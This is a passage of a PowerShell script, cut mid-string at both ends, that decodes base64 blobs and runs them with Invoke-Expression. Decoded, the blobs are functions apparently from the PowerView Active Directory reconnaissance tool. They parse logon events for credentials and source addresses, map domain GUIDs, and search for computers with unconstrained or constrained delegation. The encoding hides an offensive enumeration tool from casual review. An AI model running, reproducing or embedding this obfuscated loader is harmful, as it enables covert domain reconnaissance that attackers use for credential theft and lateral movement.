AgICAgS2V5TGVuZ3RoICAgICAgICAgICAgICAgICA9ICRQcm9wZXJ0aWVzWzE1XS5WYWx1ZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFByb2Nlc3NJZCAgICAgICAgICAgICAgICAgPSAkUHJvcGVydGllc1sxNl0uVmFsdWUKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBQcm9jZXNzTmFtZSAgICAgICAgICAgICAgID0gJFByb3BlcnRpZXNbMTddLlZhbHVlCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgSXBBZGRyZXNzICAgICAgICAgICAgICAgICA9ICRQcm9wZXJ0aWVzWzE4XS5WYWx1ZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIElwUG9ydCAgICAgICAgICAgICAgICAgICAgPSAkUHJvcGVydGllc1sxOV0uVmFsdWUKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBJbXBlcnNvbmF0aW9uTGV2ZWwgICAgICAgID0gJFByb3BlcnRpZXNbMjBdLlZhbHVlCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgUmVzdHJpY3RlZEFkbWluTW9kZSAgICAgICA9ICRQcm9wZXJ0aWVzWzIxXS5WYWx1ZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFRhcmdldE91dGJvdW5kVXNlck5hbWUgICAgPSAkUHJvcGVydGllc1syMl0uVmFsdWUKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBUYXJnZXRPdXRib3VuZERvbWFpbk5hbWUgID0gJFByb3BlcnRpZXNbMjNdLlZhbHVlCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgVmlydHVhbEFjY291bnQgICAgICAgICAgICA9ICRQcm9wZXJ0aWVzWzI0XS5WYWx1ZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFRhcmdldExpbmtlZExvZ29uSWQgICAgICAgPSAkUHJvcGVydGllc1syNV0uVmFsdWUKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBFbGV2YXRlZFRva2VuICAgICAgICAgICAgID0gJFByb3BlcnRpZXNbMjZdLlZhbHVlCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkT3V0cHV0LlBTT2JqZWN0LlR5cGVOYW1lcy5JbnNlcnQoMCwgJ1Bvd2VyVmlldy5Mb2dvbkV2ZW50JykKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRPdXRwdXQKICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICA0NjQ4IHsKICAgICAgICAgICAgICAgICAgICAgICAgaWYoKC1ub3QgJFByb3BlcnRpZXNbNV0uVmFsdWUuRW5kc1dpdGgoJyQnKSkgLWFuZCAoJFByb3BlcnRpZXNbMTFdLlZhbHVlIC1tYXRjaCAndGFza2hvc3RcLmV4ZScpKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkT3V0cHV0ID0gTmV3LU9iamVjdCBQU09iamVjdCAtUHJvcGVydHkgQHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBDb21wdXRlck5hbWUgICAgICAgICAgICAgID0gJENvbXB1dGVyCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgVGltZUNyZWF0ZWQgICAgICAgPSAkRXZlbnQuVGltZUNyZWF0ZWQKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBFdmVudElkICAgICAgICAgICA9ICRFdmVudC5JZAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFN1YmplY3RVc2VyU2lkICAgID0gJFByb3BlcnRpZXNbMF0uVmFsdWUuVG9TdHJpbmcoKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFN1YmplY3RVc2VyTmFtZSAgID0gJFByb3BlcnRpZXNbMV0uVmFsdWUKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBTdWJqZWN0RG9tYWluTmFtZSA9ICRQcm9wZXJ0aWVzWzJdLlZhbHVlCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgU3ViamVjdExvZ29uSWQgICAgPSAkUHJvcGVydGllc1szXS5WYWx1ZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIExvZ29uR3VpZCAgICAgICAgID0gJFByb3BlcnRpZXNbNF0uVmFsdWUuVG9TdHJpbmcoKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFRhcmdldFVzZXJOYW1lICAgID0gJFByb3BlcnRpZXNbNV0uVmFsdWUKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBUYXJnZXREb21haW5OYW1lICA9ICRQcm9wZXJ0aWVzWzZdLlZhbHVlCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgVGFyZ2V0TG9nb25HdWlkICAgPSAkUHJvcGVydGllc1s3XS5WYWx1ZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFRhcmdldFNlcnZlck5hbWUgID0gJFByb3BlcnRpZXNbOF0uVmFsdWUKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBUYXJnZXRJbmZvICAgICAgICA9ICRQcm9wZXJ0aWVzWzldLlZhbHVlCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgUHJvY2Vzc0lkICAgICAgICAgPSAkUHJvcGVydGllc1sxMF0uVmFsdWUKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBQcm9jZXNzTmFtZSAgICAgICA9ICRQcm9wZXJ0aWVzWzExXS5WYWx1ZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIElwQWRkcmVzcyAgICAgICAgID0gJFByb3BlcnRpZXNbMTJdLlZhbHVlCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgSXBQb3J0ICAgICAgICAgICAgPSAkUHJvcGVydGllc1sxM10uVmFsdWUKICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICRPdXRwdXQuUFNPYmplY3QuVHlwZU5hbWVzLkluc2VydCgwLCAnUG93ZXJWaWV3LkV4cGxpY2l0Q3JlZGVudGlhbExvZ29uRXZlbnQnKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJE91dHB1dAogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIGRlZmF1bHQgewogICAgICAgICAgICAgICAgICAgICAgICBXcml0ZS1XYXJuaW5nICJObyBoYW5kbGVyIGV4aXN0cyBmb3IgZXZlbnQgSUQ6ICQoJEV2ZW50LklkKSIKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICB9Cn0K")))

iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZnVuY3Rpb24gR2V0LURvbWFpbkdVSURNYXAgewogICAgW0RpYWdub3N0aWNzLkNvZGVBbmFseXNpcy5TdXBwcmVzc01lc3NhZ2VBdHRyaWJ1dGUoJ1BTU2hvdWxkUHJvY2VzcycsICcnKV0KICAgIFtPdXRwdXRUeXBlKFtIYXNodGFibGVdKV0KICAgIFtDbWRsZXRCaW5kaW5nKCldCiAgICBQYXJhbSAoCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICREb21haW4sCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbQWxpYXMoJ0RvbWFpbkNvbnRyb2xsZXInKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRTZXJ2ZXIsCiAgICAgICAgW1ZhbGlkYXRlUmFuZ2UoMSwgMTAwMDApXQogICAgICAgIFtJbnRdCiAgICAgICAgJFJlc3VsdFBhZ2VTaXplID0gMjAwLAogICAgICAgIFtWYWxpZGF0ZVJhbmdlKDEsIDEwMDAwKV0KICAgICAgICBbSW50XQogICAgICAgICRTZXJ2ZXJUaW1lTGltaXQsCiAgICAgICAgW01hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWxdCiAgICAgICAgW01hbmFnZW1lbnQuQXV0b21hdGlvbi5DcmVkZW50aWFsQXR0cmlidXRlKCldCiAgICAgICAgJENyZWRlbnRpYWwgPSBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbF06OkVtcHR5CiAgICApCiAgICAkR1VJRHMgPSBAeycwMDAwMDAwMC0wMDAwLTAwMDAtMDAwMC0wMDAwMDAwMDAwMDAnID0gJ0FsbCd9CiAgICAkRm9yZXN0QXJndW1lbnRzID0gQHt9CiAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydDcmVkZW50aWFsJ10pIHsgJEZvcmVzdEFyZ3VtZW50c1snQ3JlZGVudGlhbCddID0gJENyZWRlbnRpYWwgfQogICAgdHJ5IHsKICAgICAgICAkU2NoZW1hUGF0aCA9IChHZXQtRm9yZXN0IEBGb3Jlc3RBcmd1bWVudHMpLnNjaGVtYS5uYW1lCiAgICB9CiAgICBjYXRjaCB7CiAgICAgICAgdGhyb3cgJ1tHZXQtRG9tYWluR1VJRE1hcF0gRXJyb3IgaW4gcmV0cmlldmluZyBmb3Jlc3Qgc2NoZW1hIHBhdGggZnJvbSBHZXQtRm9yZXN0JwogICAgfQogICAgaWYgKC1ub3QgJFNjaGVtYVBhdGgpIHsKICAgICAgICB0aHJvdyAnW0dldC1Eb21haW5HVUlETWFwXSBFcnJvciBpbiByZXRyaWV2aW5nIGZvcmVzdCBzY2hlbWEgcGF0aCBmcm9tIEdldC1Gb3Jlc3QnCiAgICB9CiAgICAkU2VhcmNoZXJBcmd1bWVudHMgPSBAewogICAgICAgICdTZWFyY2hCYXNlJyA9ICRTY2hlbWFQYXRoCiAgICAgICAgJ0xEQVBGaWx0ZXInID0gJyhzY2hlbWFJREdVSUQ9KiknCiAgICB9CiAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydEb21haW4nXSkgeyAkU2VhcmNoZXJBcmd1bWVudHNbJ0RvbWFpbiddID0gJERvbWFpbiB9CiAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydTZXJ2ZXInXSkgeyAkU2VhcmNoZXJBcmd1bWVudHNbJ1NlcnZlciddID0gJFNlcnZlciB9CiAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydSZXN1bHRQYWdlU2l6ZSddKSB7ICRTZWFyY2hlckFyZ3VtZW50c1snUmVzdWx0UGFnZVNpemUnXSA9ICRSZXN1bHRQYWdlU2l6ZSB9CiAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydTZXJ2ZXJUaW1lTGltaXQnXSkgeyAkU2VhcmNoZXJBcmd1bWVudHNbJ1NlcnZlclRpbWVMaW1pdCddID0gJFNlcnZlclRpbWVMaW1pdCB9CiAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydDcmVkZW50aWFsJ10pIHsgJFNlYXJjaGVyQXJndW1lbnRzWydDcmVkZW50aWFsJ10gPSAkQ3JlZGVudGlhbCB9CiAgICAkU2NoZW1hU2VhcmNoZXIgPSBHZXQtRG9tYWluU2VhcmNoZXIgQFNlYXJjaGVyQXJndW1lbnRzCiAgICBpZiAoJFNjaGVtYVNlYXJjaGVyKSB7CiAgICAgICAgdHJ5IHsKICAgICAgICAgICAgJFJlc3VsdHMgPSAkU2NoZW1hU2VhcmNoZXIuRmluZEFsbCgpCiAgICAgICAgICAgICRSZXN1bHRzIHwgV2hlcmUtT2JqZWN0IHskX30gfCBGb3JFYWNoLU9iamVjdCB7CiAgICAgICAgICAgICAgICAkR1VJRHNbKE5ldy1PYmplY3QgR3VpZCAoLCRfLnByb3BlcnRpZXMuc2NoZW1haWRndWlkWzBdKSkuR3VpZF0gPSAkXy5wcm9wZXJ0aWVzLm5hbWVbMF0KICAgICAgICAgICAgfQogICAgICAgICAgICBpZiAoJFJlc3VsdHMpIHsKICAgICAgICAgICAgICAgIHRyeSB7ICRSZXN1bHRzLmRpc3Bvc2UoKSB9CiAgICAgICAgICAgICAgICBjYXRjaCB7CiAgICAgICAgICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiW0dldC1Eb21haW5HVUlETWFwXSBFcnJvciBkaXNwb3Npbmcgb2YgdGhlIFJlc3VsdHMgb2JqZWN0OiAkXyIKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgICAgICAkU2NoZW1hU2VhcmNoZXIuZGlzcG9zZSgpCiAgICAgICAgfQogICAgICAgIGNhdGNoIHsKICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiW0dldC1Eb21haW5HVUlETWFwXSBFcnJvciBpbiBidWlsZGluZyBHVUlEIG1hcDogJF8iCiAgICAgICAgfQogICAgfQogICAgJFNlYXJjaGVyQXJndW1lbnRzWydTZWFyY2hCYXNlJ10gPSAkU2NoZW1hUGF0aC5yZXBsYWNlKCdTY2hlbWEnLCdFeHRlbmRlZC1SaWdodHMnKQogICAgJFNlYXJjaGVyQXJndW1lbnRzWydMREFQRmlsdGVyJ10gPSAnKG9iamVjdENsYXNzPWNvbnRyb2xBY2Nlc3NSaWdodCknCiAgICAkUmlnaHRzU2VhcmNoZXIgPSBHZXQtRG9tYWluU2VhcmNoZXIgQFNlYXJjaGVyQXJndW1lbnRzCiAgICBpZiAoJFJpZ2h0c1NlYXJjaGVyKSB7CiAgICAgICAgdHJ5IHsKICAgICAgICAgICAgJFJlc3VsdHMgPSAkUmlnaHRzU2VhcmNoZXIuRmluZEFsbCgpCiAgICAgICAgICAgICRSZXN1bHRzIHwgV2hlcmUtT2JqZWN0IHskX30gfCBGb3JFYWNoLU9iamVjdCB7CiAgICAgICAgICAgICAgICAkR1VJRHNbJF8ucHJvcGVydGllcy5yaWdodHNndWlkWzBdLnRvU3RyaW5nKCldID0gJF8ucHJvcGVydGllcy5uYW1lWzBdCiAgICAgICAgICAgIH0KICAgICAgICAgICAgaWYgKCRSZXN1bHRzKSB7CiAgICAgICAgICAgICAgICB0cnkgeyAkUmVzdWx0cy5kaXNwb3NlKCkgfQogICAgICAgICAgICAgICAgY2F0Y2ggewogICAgICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIltHZXQtRG9tYWluR1VJRE1hcF0gRXJyb3IgZGlzcG9zaW5nIG9mIHRoZSBSZXN1bHRzIG9iamVjdDogJF8iCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICAgICAgJFJpZ2h0c1NlYXJjaGVyLmRpc3Bvc2UoKQogICAgICAgIH0KICAgICAgICBjYXRjaCB7CiAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIltHZXQtRG9tYWluR1VJRE1hcF0gRXJyb3IgaW4gYnVpbGRpbmcgR1VJRCBtYXA6ICRfIgogICAgICAgIH0KICAgIH0KICAgICRHVUlEcwp9Cg==")))

iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZnVuY3Rpb24gR2V0LURvbWFpbkNvbXB1dGVyIHsKICAgIFtPdXRwdXRUeXBlKCdQb3dlclZpZXcuQ29tcHV0ZXInKV0KICAgIFtPdXRwdXRUeXBlKCdQb3dlclZpZXcuQ29tcHV0ZXIuUmF3JyldCiAgICBbQ21kbGV0QmluZGluZygpXQogICAgUGFyYW0gKAogICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb24gPSAwLCBWYWx1ZUZyb21QaXBlbGluZSA9ICRUcnVlLCBWYWx1ZUZyb21QaXBlbGluZUJ5UHJvcGVydHlOYW1lID0gJFRydWUpXQogICAgICAgIFtBbGlhcygnU2FtQWNjb3VudE5hbWUnLCAnTmFtZScsICdETlNIb3N0TmFtZScpXQogICAgICAgIFtTdHJpbmdbXV0KICAgICAgICAkSWRlbnRpdHksCiAgICAgICAgW1N3aXRjaF0KICAgICAgICAkVW5jb25zdHJhaW5lZCwKICAgICAgICBbU3dpdGNoXQogICAgICAgICRUcnVzdGVkVG9BdXRoLAogICAgICAgIFtTd2l0Y2hdCiAgICAgICAgJFByaW50ZXJzLAogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW0FsaWFzKCdTZXJ2aWNlUHJpbmNpcGFsTmFtZScpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJFNQTiwKICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJE9wZXJhdGluZ1N5c3RlbSwKICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJFNlcnZpY2VQYWNrLAogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkU2l0ZU5hbWUsCiAgICAgICAgW1N3aXRjaF0KICAgICAgICAkUGluZywKICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJERvbWFpbiwKICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtBbGlhcygnRmlsdGVyJyldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkTERBUEZpbHRlciwKICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtTdHJpbmdbXV0KICAgICAgICAkUHJvcGVydGllcywKICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtBbGlhcygnQURTUGF0aCcpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJFNlYXJjaEJhc2UsCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbQWxpYXMoJ0RvbWFpbkNvbnRyb2xsZXInKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRTZXJ2ZXIsCiAgICAgICAgW1ZhbGlkYXRlU2V0KCdCYXNlJywgJ09uZUxldmVsJywgJ1N1YnRyZWUnKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRTZWFyY2hTY29wZSA9ICdTdWJ0cmVlJywKICAgICAgICBbVmFsaWRhdGVSYW5nZSgxLCAxMDAwMCldCiAgICAgICAgW0ludF0KICAgICAgICAkUmVzdWx0UGFnZVNpemUgPSAyMDAsCiAgICAgICAgW1ZhbGlkYXRlUmFuZ2UoMSwgMTAwMDApXQogICAgICAgIFtJbnRdCiAgICAgICAgJFNlcnZlclRpbWVMaW1pdCwKICAgICAgICBbVmFsaWRhdGVTZXQoJ0RhY2wnLCAnR3JvdXAnLCAnTm9uZScsICdPd25lcicsICdTYWNsJyldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkU2VjdXJpdHlNYXNrcywKICAgICAgICBbU3dpdGNoXQogICAgICAgICRUb21ic3RvbmUsCiAgICAgICAgW0FsaWFzKCdSZXR1cm5PbmUnKV0KICAgICAgICBbU3dpdGNoXQogICAgICAgICRGaW5kT25lLAogICAgICAgIFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsXQogICAgICAgIFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uQ3JlZGVudGlhbEF0dHJpYnV0ZSgpXQogICAgICAgICRDcmVkZW50aWFsID0gW01hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWxdOjpFbXB0eSwKICAgICAgICBbU3dpdGNoXQogICAgICAgICRSYXcKICAgICkKICAgIER5bmFtaWNQYXJhbSB7CiAgICAgICAgJFVBQ1ZhbHVlTmFtZXMgPSBbRW51bV06OkdldE5hbWVzKCRVQUNFbnVtKQogICAgICAgICRVQUNWYWx1ZU5hbWVzID0gJFVBQ1ZhbHVlTmFtZXMgfCBGb3JFYWNoLU9iamVjdCB7JF87ICJOT1RfJF8ifQogICAgICAgIE5ldy1EeW5hbWljUGFyYW1ldGVyIC1OYW1lIFVBQ0ZpbHRlciAtVmFsaWRhdGVTZXQgJFVBQ1ZhbHVlTmFtZXMgLVR5cGUgKFthcnJheV0pCiAgICB9CiAgICBCRUdJTiB7CiAgICAgICAgJFNlYXJjaGVyQXJndW1lbnRzID0gQHt9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snRG9tYWluJ10pIHsgJFNlYXJjaGVyQXJndW1lbnRzWydEb21haW4nXSA9ICREb21haW4gfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1Byb3BlcnRpZXMnXSkgeyAkU2VhcmNoZXJBcmd1bWVudHNbJ1Byb3BlcnRpZXMnXSA9ICRQcm9wZXJ0aWVzIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydTZWFyY2hCYXNlJ10pIHsgJFNlYXJjaGVyQXJndW1lbnRzWydTZWFyY2hCYXNlJ10gPSAkU2VhcmNoQmFzZSB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snU2VydmVyJ10pIHsgJFNlYXJjaGVyQXJndW1lbnRzWydTZXJ2ZXInXSA9ICRTZXJ2ZXIgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1NlYXJjaFNjb3BlJ10pIHsgJFNlYXJjaGVyQXJndW1lbnRzWydTZWFyY2hTY29wZSddID0gJFNlYXJjaFNjb3BlIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydSZXN1bHRQYWdlU2l6ZSddKSB7ICRTZWFyY2hlckFyZ3VtZW50c1snUmVzdWx0UGFnZVNpemUnXSA9ICRSZXN1bHRQYWdlU2l6ZSB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snU2VydmVyVGltZUxpbWl0J10pIHsgJFNlYXJjaGVyQXJndW1lbnRzWydTZXJ2ZXJUaW1lTGltaXQnXSA9ICRTZXJ2ZXJUaW1lTGltaXQgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1NlY3VyaXR5TWFza3MnXSkgeyAkU2VhcmNoZXJBcmd1bWVudHNbJ1NlY3VyaXR5TWFza3MnXSA9ICRTZWN1cml0eU1hc2tzIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydUb21ic3RvbmUnXSkgeyAkU2VhcmNoZXJBcmd1bWVudHNbJ1RvbWJzdG9uZSddID0gJFRvbWJzdG9uZSB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snQ3JlZGVudGlhbCddKSB7ICRTZWFyY2hlckFyZ3VtZW50c1snQ3JlZGVudGlhbCddID0gJENyZWRlbnRpYWwgfQogICAgICAgICRDb21wU2VhcmNoZXIgPSBHZXQtRG9tYWluU2VhcmNoZXIgQFNlYXJjaGVyQXJndW1lbnRzCiAgICB9CiAgICBQUk9DRVNTIHsKICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzIC1hbmQgKCRQU0JvdW5kUGFyYW1ldGVycy5Db3VudCAtbmUgMCkpIHsKICAgICAgICAgICAgTmV3LUR5bmFtaWNQYXJhbWV0ZXIgLUNyZWF0ZVZhcmlhYmxlcyAtQm91bmRQYXJhbWV0ZXJzICRQU0JvdW5kUGFyYW1ldGVycwogICAgICAgIH0KICAgICAgICBpZiAoJENvbXBTZWFyY2hlcikgewogICAgICAgICAgICAkSWRlbnRpdHlGaWx0ZXIgPSAnJwogICAgICAgICAgICAkRmlsdGVyID0gJycKICAgICAgICAgICAgJElkZW50aXR5IHwgV2hlcmUtT2JqZWN0IHskX30gfCBGb3JFYWNoLU9iamVjdCB7CiAgICAgICAgICAgICAgICAkSWRlbnRpdHlJbnN0YW5jZSA9ICRfLlJlcGxhY2UoJygnLCAnXDI4JykuUmVwbGFjZSgnKScsICdcMjknKQogICAgICAgICAgICAgICAgaWYgKCRJZGVudGl0eUluc3RhbmNlIC1tYXRjaCAnXlMtMS0nKSB7CiAgICAgICAgICAgICAgICAgICAgJElkZW50aXR5RmlsdGVyICs9ICIob2JqZWN0c2lkPSRJZGVudGl0eUluc3RhbmNlKSIKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIGVsc2VpZiAoJElkZW50aXR5SW5zdGFuY2UgLW1hdGNoICdeQ049JykgewogICAgICAgICAgICAgICAgICAgICRJZGVudGl0eUZpbHRlciArPSAiKGRpc3Rpbmd1aXNoZWRuYW1lPSRJZGVudGl0eUluc3RhbmNlKSIKICAgICAgICAgICAgICAgICAgICBpZiAoKC1ub3QgJFBTQm91bmRQYXJhbWV0ZXJzWydEb21haW4nXSkgLWFuZCAoLW5vdCAkUFNCb3VuZFBhcmFtZXRlcnNbJ1NlYXJjaEJhc2UnXSkpIHsKICAgICAgICAgICAgICAgICAgICAgICAgJElkZW50aXR5RG9tYWluID0gJElkZW50aXR5SW5zdGFuY2UuU3ViU3RyaW5nKCRJZGVudGl0eUluc3RhbmNlLkluZGV4T2YoJ0RDPScpKSAtcmVwbGFjZSAnREM9JywnJyAtcmVwbGFjZSAnLCcsJy4nCiAgICAgICAgICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIltHZXQtRG9tYWluQ29tcHV0ZXJdIEV4dHJhY3RlZCBkb21haW4gJyRJZGVudGl0eURvbWFpbicgZnJvbSAnJElkZW50aXR5SW5zdGFuY2UnIgogICAgICAgICAgICAgICAgICAgICAgICAkU2VhcmNoZXJBcmd1bWVudHNbJ0RvbWFpbiddID0gJElkZW50aXR5RG9tYWluCiAgICAgICAgICAgICAgICAgICAgICAgICRDb21wU2VhcmNoZXIgPSBHZXQtRG9tYWluU2VhcmNoZXIgQFNlYXJjaGVyQXJndW1lbnRzCiAgICAgICAgICAgICAgICAgICAgICAgIGlmICgtbm90ICRDb21wU2VhcmNoZXIpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIFdyaXRlLVdhcm5pbmcgIltHZXQtRG9tYWluQ29tcHV0ZXJdIFVuYWJsZSB0byByZXRyaWV2ZSBkb21haW4gc2VhcmNoZXIgZm9yICckSWRlbnRpdHlEb21haW4nIgogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgZWxzZWlmICgkSWRlbnRpdHlJbnN0YW5jZS5Db250YWlucygnLicpKSB7CiAgICAgICAgICAgICAgICAgICAgJElkZW50aXR5RmlsdGVyICs9ICIofChuYW1lPSRJZGVudGl0eUluc3RhbmNlKShkbnNob3N0bmFtZT0kSWRlbnRpdHlJbnN0YW5jZSkpIgogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgZWxzZWlmICgkSWRlbnRpdHlJbnN0YW5jZSAtaW1hdGNoICdeWzAtOUEtRl17OH0tKFswLTlBLUZdezR9LSl7M31bMC05QS1GXXsxMn0kJykgewogICAgICAgICAgICAgICAgICAgICRHdWlkQnl0ZVN0cmluZyA9ICgoW0d1aWRdJElkZW50aXR5SW5zdGFuY2UpLlRvQnl0ZUFycmF5KCkgfCBGb3JFYWNoLU9iamVjdCB7ICdcJyArICRfLlRvU3RyaW5nKCdYMicpIH0pIC1qb2luICcnCiAgICAgICAgICAgICAgICAgICAgJElkZW50aXR5RmlsdGVyICs9ICIob2JqZWN0Z3VpZD0kR3VpZEJ5dGVTdHJpbmcpIgogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgZWxzZSB7CiAgICAgICAgICAgICAgICAgICAgJElkZW50aXR5RmlsdGVyICs9ICIobmFtZT0kSWRlbnRpdHlJbnN0YW5jZSkiCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICAgICAgaWYgKCRJZGVudGl0eUZpbHRlciAtYW5kICgkSWRlbnRpdHlGaWx0ZXIuVHJpbSgpIC1uZSAnJykgKSB7CiAgICAgICAgICAgICAgICAkRmlsdGVyICs9ICIofCRJZGVudGl0eUZpbHRlcikiCiAgICAgICAgICAgIH0KICAgICAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snVW5jb25zdHJhaW5lZCddKSB7CiAgICAgICAgICAgICAgICBXcml0ZS1WZXJib3NlICdbR2V0LURvbWFpbkNvbXB1dGVyXSBTZWFyY2hpbmcgZm9yIGNvbXB1dGVycyB3aXRoIGZvciB1bmNvbnN0cmFpbmVkIGRlbGVnYXRpb24nCiAgICAgICAgICAgICAgICAkRmlsdGVyICs9ICcodXNlckFjY291bnRDb250cm9sOjEuMi44NDAuMTEzNTU2LjEuNC44MDM6PTUyNDI4OCknCiAgICAgICAgICAgIH0KICAgICAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snVHJ1c3RlZFRvQXV0aCddKSB7CiAgICAgICAgICAgICAgICBXcml0ZS1WZXJib3NlICdbR2V0LURvbWFpbkNvbXB1dGVyXSBTZWFyY2hpbmcgZm9yIGNvbXB1dGVycyB0aGF0IGFyZSB0cnVzdGVkIHRvIGF1dGhlbnRpY2F0ZSBmb3Igb3RoZXIgcHJpbmNpcGFscycKICAgICAgICAgICAgICAgICRGaWx0ZXIgKz0gJyhtc2RzLWFsbG93ZWR0b2RlbGVnYXRldG89KiknCiAgICAgICAgICAgIH0KICAgICAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snUHJpbnRlcnMnXSkgewogICAgICAgICAgICAgICAgV3JpdGUtVmVyYm9zZ